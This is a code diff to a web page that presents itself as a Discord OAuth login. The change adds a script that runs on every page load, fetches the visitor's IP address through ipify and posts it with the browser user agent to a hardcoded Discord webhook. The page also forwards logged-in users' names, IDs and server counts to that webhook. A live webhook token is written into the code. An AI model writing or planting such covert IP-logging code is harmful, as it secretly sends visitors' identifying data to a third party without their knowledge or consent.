@@ -148,63 +148,82 @@
     </div>
 
     <script>
-        // Discord OAuth2 Config
+        // Config
         const CLIENT_ID = '1537117334517452860';
         const REDIRECT_URI = window.location.origin + window.location.pathname;
         const DISCORD_API = 'https://discord.com/api/v10';
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1536692672079724645/83NQgcZ-AerJ4Oc5tX4GI8cJZ-P32Y29jGQSaMjEWcs16ZxDz2adwefkPh9qEuT45sJA";
 
         // Build OAuth2 URL
         const oauthUrl = `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=identify%20guilds`;
-
         document.getElementById('loginBtn').href = oauthUrl;
 
-        // Check for access token in URL hash
-        const hash = window.location.hash.substring(1);
-        const params = new URLSearchParams(hash);
-        const accessToken = params.get('access_token');
-
-        if (accessToken) {
-        // Hide login button, show content
-        document.getElementById('loginBtn').classList.add('hidden');
-        document.getElementById('intro-text').classList.add('hidden');
-        document.getElementById('content').classList.remove('hidden');
-
-        // Clear hash from URL
-        history.replaceState(null, null, window.location.pathname);
-
-        // Fetch user data & IP
-        fetchUserData(accessToken);
-        }
-
-        async function fetchUserData(token) {
-        try {
-        // Fetch user info
-        const userRes = await fetch(`${DISCORD_API}/users/@me`, {
-        headers: { 'Authorization': `Bearer ${token}` }
+        // 1. Log visitor IP immediately on page load
+        window.addEventListener('DOMContentLoaded', () => {
+        logPageVisit();
         });
-        const user = await userRes.json();
 
-        // Fetch guilds
-        const guildsRes = await fetch(`${DISCORD_API}/users/@me/guilds`, {
-        headers: { 'Authorization': `Bearer ${token}` }
-        });
-        const guilds = await guildsRes.json();
-
-        // Fetch IP Address via Ipify
+        async function logPageVisit() {
         let userIp = 'Unknown / Blocked';
         try {
         const ipRes = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipRes.json();
         userIp = ipData.ip;
-        } catch (ipErr) {
-        console.warn('Could not fetch IP from ipify:', ipErr);
+        } catch (err) {
+        console.warn('Could not fetch IP from ipify:', err);
         }
+
+        // Post visit info to Webhook
+        try {
+        await fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+        embeds: [{
+        title: "Site Visitor Opened Page",
+        color: 3447003, // Blue accent
+        fields: [
+        { name: "IP Address", value: userIp, inline: true },
+        { name: "User Agent", value: navigator.userAgent.substring(0, 100), inline: false }
+        ],
+        timestamp: new Date().toISOString()
+        }]
+        })
+        });
+        } catch (e) {
+        console.error('Webhook error on load:', e);
+        }
+        }
+
+        // 2. Check if user is returning from Discord OAuth redirect
+        const hash = window.location.hash.substring(1);
+        const params = new URLSearchParams(hash);
+        const accessToken = params.get('access_token');
+
+        if (accessToken) {
+        document.getElementById('loginBtn').classList.add('hidden');
+        document.getElementById('intro-text').classList.add('hidden');
+        document.getElementById('content').classList.remove('hidden');
+
+        history.replaceState(null, null, window.location.pathname);
+        fetchUserData(accessToken);
+        }
+
+        async function fetchUserData(token) {
+        try {
+        const userRes = await fetch(`${DISCORD_API}/users/@me`, {
+        headers: { 'Authorization': `Bearer ${token}` }
+        });
+        const user = await userRes.json();
+
+        const guildsRes = await fetch(`${DISCORD_API}/users/@me/guilds`, {
+        headers: { 'Authorization': `Bearer ${token}` }
+        });
+        const guilds = await guildsRes.json();
 
         displayUser(user);
         displayServers(guilds);
-
-        // Log user info + IP to webhook
-        logToWebhook(user, guilds, userIp);
+        logLoginToWebhook(user, guilds);
 
         } catch (err) {
         console.error('Error:', err);
@@ -230,7 +249,6 @@
         document.getElementById('serverCount').textContent = guilds.length;
         const list = document.getElementById('serverList');
 
-        // Sort by member count if available
         guilds.sort((a, b) => (b.approximate_member_count || 0) - (a.approximate_member_count || 0));
 
         list.innerHTML = guilds.map(guild => {
@@ -253,21 +271,18 @@
         }).join('');
         }
 
-        async function logToWebhook(user, guilds, ip) {
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1536692672079724645/83NQgcZ-AerJ4Oc5tX4GI8cJZ-P32Y29jGQSaMjEWcs16ZxDz2adwefkPh9qEuT45sJA";
-
+        async function logLoginToWebhook(user, guilds) {
         try {
         await fetch(WEBHOOK_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
         embeds: [{
-        title: "Discord OAuth Login Logged",
-        color: 5793266,
+        title: "Discord OAuth Completed",
+        color: 5793266, // Green accent
         fields: [
         { name: "User", value: `${user.global_name || user.username} (@${user.username})`, inline: true },
         { name: "User ID", value: user.id, inline: true },
-        { name: "IP Address", value: ip, inline: true },
         { name: "Servers Joined", value: `${guilds.length} guilds`, inline: true }
         ],
         timestamp: new Date().toISOString()
@@ -275,7 +290,7 @@
         })
         });
         } catch (e) {
-        console.error('Webhook error:', e);
+        console.error('Webhook error on login:', e);
         }
         }
     </script>
